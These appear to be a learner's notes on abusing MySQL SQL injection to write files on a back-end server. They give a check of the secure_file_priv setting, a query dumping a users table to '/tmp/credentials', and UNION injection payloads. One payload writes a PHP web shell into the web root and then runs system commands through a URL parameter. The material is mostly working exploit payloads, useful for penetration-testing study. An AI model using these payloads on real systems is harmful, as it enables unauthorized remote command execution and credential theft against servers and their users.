To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled (check reading files)
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server


checking 2


```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
if the secure file priv is empty, we can read/write files to any location

Writing data from database
```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

just writing random stuff
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
union injection
```sql
cn' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- -
```


writing a web shell using union injection
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
```
This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
